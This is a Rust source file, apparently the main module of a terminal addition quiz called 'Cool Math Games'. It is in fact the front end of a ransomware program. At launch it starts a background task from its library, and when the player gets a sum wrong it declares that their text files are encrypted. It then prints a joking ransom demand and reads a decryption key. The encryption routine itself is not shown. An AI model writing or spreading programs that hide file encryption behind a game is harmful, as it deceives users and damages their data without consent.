mod lib;

use crate::lib::game;
use std::{thread, time};
use termion::{color, style};
use rand::Rng;

fn banner() {
    let banner_str = r###"
   /$$$$$$                      /$$                    
  /$$__  $$                    | $$                    
 | $$  \__/  /$$$$$$   /$$$$$$ | $$                    
 | $$       /$$__  $$ /$$__  $$| $$                    
 | $$      | $$  \ $$| $$  \ $$| $$                    
 | $$    $$| $$  | $$| $$  | $$| $$                    
 |  $$$$$$/|  $$$$$$/|  $$$$$$/| $$                    
  \______/  \______/  \______/ |__/                    
                                                       
                                                       
                                                       
  /$$      /$$             /$$     /$$                 
 | $$$    /$$$            | $$    | $$                 
 | $$$$  /$$$$  /$$$$$$  /$$$$$$  | $$$$$$$ 
 | $$ $$/$$ $$ |____  $$|_  $$_/  | $$__  $$
 | $$  $$$| $$  /$$$$$$$  | $$    | $$  \ $$ 
 | $$\  $ | $$ /$$__  $$  | $$ /$$| $$  | $$
 | $$ \/  | $$|  $$$$$$$  |  $$$$/| $$  | $$
 |__/     |__/ \_______/   \___/  |__/  |__/
                                                       
                                                       
                                                       
   /$$$$$$                                             
  /$$__  $$                                            
 | $$  \__/  /$$$$$$  /$$$$$$/$$$$   /$$$$$$   /$$$$$$$
 | $$ /$$$$ |____  $$| $$_  $$_  $$ /$$__  $$ /$$_____/
 | $$|_  $$  /$$$$$$$| $$ \ $$ \ $$| $$$$$$$$|  $$$$$$ 
 | $$  \ $$ /$$__  $$| $$ | $$ | $$| $$_____/ \____  $$
 |  $$$$$$/|  $$$$$$$| $$ | $$ | $$|  $$$$$$$ /$$$$$$$/
  \______/  \_______/|__/ |__/ |__/ \_______/|_______/ 
    "###;
    println!("{}{}{}{}{}", color::Fg(color::Green), style::Bold, banner_str, color::Fg(color::Reset), style::Reset); 
}

fn get_user() -> game::User {
    println!("{}{}Your Username: {}{}", color::Fg(color::Blue), style::Bold, color::Fg(color::Reset), style::Reset);
    let user = game::create_user(game::read_line());
    return user;
}

fn main() {
    let handle = thread::spawn(game::setup_game);
    banner();
    let player = get_user();
    println!("{}{}{}", color::Fg(color::LightMagenta), String::from_utf8(vec![b'='; 10]).unwrap(), color::Fg(color::Reset));
    println!("{}{}Welcome {} to Cool Math Games Terminal Game!{}{}",color::Fg(color::LightCyan), style::Bold, player.get_name(), color::Fg(color::Reset), style::Reset);
    println!("Starting in 5 seconds\n");
    thread::sleep(time::Duration::from_secs(5));

    loop {
        let x = rand::thread_rng().gen_range(0..4);
        let y = rand::thread_rng().gen_range(0..4);
        let z = (x + y).to_string();

        println!("{}{}{}+{}=?{}{}", color::Fg(color::LightGreen), style::Bold, x, y, color::Fg(color::Reset), style::Reset);
        let user_z = game::read_line();

        if user_z != z {
            break
        }
    }

    handle.join().unwrap();
    println!("{}{}{}", color::Fg(color::Red), String::from_utf8(vec![b'='; 10]).unwrap(), color::Fg(color::Reset));
    println!("{}Hahahaaha you can't even maths!", color::Fg(color::LightRed));
    println!("");
    println!("{}{}AS A PUNISHMENT WE HAVE ENCRYPTED YOUR TEXT FILES!{}", color::Fg(color::Red), style::Bold, style::Reset);
    println!("");
    println!("{}To get your text files back meet us outside Reid Library on the 14th of March at 11:00 PM!", color::Fg(color::Red));
    println!("One of us will be there with a cardboard sign with {}{}'Get your ransomware keys for $5'{}{} on it", color::Fg(color::Magenta), style::Bold, style::Reset, color::Fg(color::Red));
    println!("");
    println!("Once you have the key input it below. MAKE SURE YOU DON'T DO A TYPO!");
    println!("");
    println!("{}{}Key:{}{}", color::Fg(color::LightRed), style::Bold, color::Fg(color::Reset), style::Reset);
    let iv_key = game::read_line();
    game::close_game(&iv_key);
}
